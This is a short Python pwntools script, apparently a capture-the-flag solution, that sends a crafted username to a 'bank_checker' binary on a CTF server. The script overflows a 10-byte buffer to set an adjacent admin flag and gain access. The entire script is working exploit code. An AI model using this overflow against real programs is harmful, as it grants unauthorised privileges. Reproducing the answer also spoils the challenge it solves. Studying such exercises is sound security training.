#!/usr/bin/env python3
from pwn import *

exe = ELF("./bank_checker")
context.binary = exe

if args.REMOTE:
    r = remote("chals.disorientation.cssa.club", 1345)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

# Payload should authenticate ZOOWEE then overflow ADMIN_ALLOWED to be TRUE
BUFF_SIZE = 10
username = b"ZOOWEE\x00"   
padding = BUFF_SIZE - len(username)
payload = username
payload += b"A" * padding
payload += p32(1)   

r.sendlineafter(b"Please enter username", payload)
r.interactive()
